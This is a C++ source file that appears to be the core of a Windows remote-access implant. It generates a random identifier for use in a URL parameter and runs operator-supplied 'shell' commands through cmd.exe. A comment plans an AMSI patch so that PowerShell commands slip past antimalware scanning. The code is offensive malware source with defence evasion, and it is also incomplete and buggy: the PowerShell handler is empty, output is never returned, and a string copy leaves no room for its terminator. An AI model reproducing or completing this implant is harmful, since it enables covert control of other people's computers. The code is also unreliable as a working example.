#include <iostream>
#include <vector>
#include <string>
#include "Windows.h"
#include "wincrypt.h"
#include "base64.h"
#include "dependencies.h"
#include "process.h"
#include "core.h"

core::core() {
	HCRYPTPROV hCryptProv;
	
	// we can use any number of bytes, 128 just feels perfect
	int bufLength = 128;
	BYTE * buf = (BYTE*)malloc(bufLength *sizeof(BYTE));

	// get the Crypto Context
	if (!CryptAcquireContext(
		&hCryptProv,
		NULL,
		NULL,
		PROV_RSA_FULL,
		CRYPT_VERIFYCONTEXT))
	{
		std::cout << "[!] ERROR: CryptAcquireContext " << GetLastError() << std::endl;
	}

	// generate 128 random bytes
	if (!CryptGenRandom(hCryptProv, (DWORD) bufLength, buf)) {
		std::cout << "[!] ERROR: CryptGenRandom " << GetLastError() << std::endl;
	}

	// encode bytes base64
	std::string base64EncodedIdentifier = base64::encode(buf, bufLength);
	// sanitize identifier from anything non-alpha-numeric (we will use it in the URL param)
	base64EncodedIdentifier = dependencies::sanitize_identifier(base64EncodedIdentifier);

	// erase the heap
	if(buf!=NULL)
		free(buf);

	// we will assign the identifier
	this->identifier = base64EncodedIdentifier;
}

core::core(std::string identifier) {
	this->identifier = identifier;
}

std::string core::execute_command(std::string cmd){
	// Some cases:
	// "shell " + anything => spawns and executes a CMD.exe command (fork & run)
	// "powershell " + anything => spawns and executes a POWERSHELL.exe command (fork & run)
	// more will come soon
	// ONE NOTE TO IMPLEMENT: We need an AMSI patching function to be called automatically when executing a powershell command - TODO: @teodor

	// execute CMD.exe
	if (cmd.rfind("shell ", 0) == 0) {
		// replace "shell " part
		cmd = cmd.substr(6, cmd.size() - 6);
		return this->execute_cmd(cmd);
	}

	// execute POWERSHELL.exe
	if (cmd.rfind("powershell ", 0) == 0) {
		// replace "powershell " part
		cmd = cmd.substr(11, cmd.size() - 11);
		return this->execute_powershell(cmd);
	}
}

std::string core::execute_cmd(std::string cmd) {
	std::string result = "";
	std::string fullCommand = "C:\\Windows\\System32\\cmd.exe /c " + cmd;
	// we need wide chars for our process creation function
	std::wstring wideFullCommand = std::wstring(fullCommand.begin(), fullCommand.end());
	wchar_t* genericFullCommand = (wchar_t*) malloc(sizeof(wchar_t) * wideFullCommand.size());
	wcscpy_s(genericFullCommand, wideFullCommand.size(), wideFullCommand.c_str());
	PPROCESS_INFORMATION pi = process::create_process(genericFullCommand);

	return result;
}

std::string core::execute_powershell(std::string cmd) {
	std::string result = "";

	return result;

}